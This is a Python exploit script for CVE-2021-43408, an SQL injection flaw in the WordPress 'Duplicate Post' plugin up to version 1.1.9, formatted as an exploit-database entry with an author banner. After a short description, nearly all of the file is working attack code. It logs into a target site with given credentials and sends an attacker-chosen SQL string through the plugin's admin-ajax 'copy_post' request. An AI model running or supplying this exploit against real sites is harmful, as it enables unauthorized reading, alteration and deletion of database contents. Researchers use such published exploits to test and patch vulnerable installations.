# Exploit Title: Wordpress Plugin Duplicate Post V 1.1.9 - SQL Injection
# Date 06.12.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://wordpress.org/plugins/copy-delete-posts/
# Software Link: https://downloads.wordpress.org/plugin/copy-delete-posts.1.1.9.zip
# Version: <= 1.1.9
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-43408
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-43408/README.md
# Credits to: https://appcheck-ng.com/security-advisory-duplicate-post-wordpress-plugin-sql-injection-vulnerability/

'''
Description:
The "Duplicate Post" WordPress plugin up to and including version 1.1.9 is vulnerable to SQL Injection.
SQL injection vulnerabilities occur when client supplied data is included within an SQL Query insecurely.
SQL Injection can typically be exploited to read, modify and delete SQL table data.
In many cases it also possible to exploit features of SQL server to execute system commands and/
or access the local file system. This particular vulnerability can be exploited by any authenticated user
who has been granted access to use the Duplicate Post plugin. By default, this is limited to Administrators,
however the plugin presents the option to permit access to the Editor, Author, Contributor and Subscriber roles.
'''

# Banner:
banner =  """
                                                            
 ### #   # ####      ###  ##  ### ###          #  ###   #   ##   ### 
##   #   # #           # #  #   #   #         ##    #  ##  #  # #  # 
#     # #  ###         # #  #   #   #         ##  ##   ##  #  #  ##  
#     # #  #    ####  #  #  #  #    #   #### # #    # # #  #  # #### 
##    # #  #         #   #  # #     #        ####   # #### #  # #  # 
 ###   #   ####      ###  ##  ### #####        #  ##    #   ##   ##  
                            
                            [+] Duplicate Post SQL Injection
                            [@] Developed by Ron Jost (Hacker5preme)                                                                     
                                                               
"""

print(banner)

import argparse
import requests
from datetime import datetime

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Duplicate Post - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
my_parser.add_argument('-C', '--COMMAND', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
command = args.COMMAND

print('')
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('')

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)
#print(auth.text)
check = session.get('http://' + target_ip + ':' + target_port + wp_path+ 'wp-admin/edit.php')
# Exploit:
exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php'

# Header (Exploit):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': '*/*',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://' + target_ip + '/wordpress/wp-admin/edit.php',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'http://' + target_ip,
    'Connection': 'close'
}

# Body (Exploit):
body = {
    "action": "cdp_action_handling",
    "token": "cdp",
    "f": "copy_post",
    "origin": "tooltip",
    "id[]": command,
    "data[type]": "copy-quick",
    "data[times]": "1",
    "data[site]": "-1",
    "data[profile]": "default",
    "data[swap]": "fals"
}
a = session.post(exploit_url, headers=header, data=body)
print(a.text)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))